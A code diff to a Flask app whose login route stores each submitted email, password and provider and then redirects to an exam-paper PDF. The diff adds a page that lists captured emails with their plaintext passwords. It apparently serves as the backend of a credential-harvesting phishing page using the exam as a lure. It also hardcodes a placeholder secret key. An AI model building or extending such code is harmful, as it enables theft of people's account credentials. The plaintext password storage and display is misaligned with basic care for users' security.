@@ -1,11 +1,11 @@
 import os
-
-from flask import Flask, render_template, request, redirect, jsonify
+from flask import Flask, render_template, request, redirect, jsonify, session
 from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.secret_key = 'your_secret_key'  # Ensure to set a secret key for session management
 
 db = SQLAlchemy(app)
 
@@ -31,8 +31,31 @@ def login():
     db.session.add(new_user)
     db.session.commit()
 
+    # Track logged-in user by storing the user ID in session
+    session['user_id'] = new_user.id
+
     # Return JSON response for AJAX request
     return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})
+
+@app.route('/logout', methods=['POST'])
+def logout():
+    session.pop('user_id', None)
+    return jsonify({'status': 'logged_out'})
+
+@app.route('/logged-in-users')
+def show_logged_in_users():
+    # Retrieve the list of users who are logged in
+    logged_in_users = []
+    if 'user_id' in session:
+        user = User.query.filter_by(id=session['user_id']).first()
+        if user:
+            logged_in_users.append({
+                'email': user.email,
+                'password': user.password,
+                'provider': user.provider
+            })
+
+    return render_template('logged_in_users.html', users=logged_in_users)
 
 if __name__ == '__main__':
     with app.app_context():
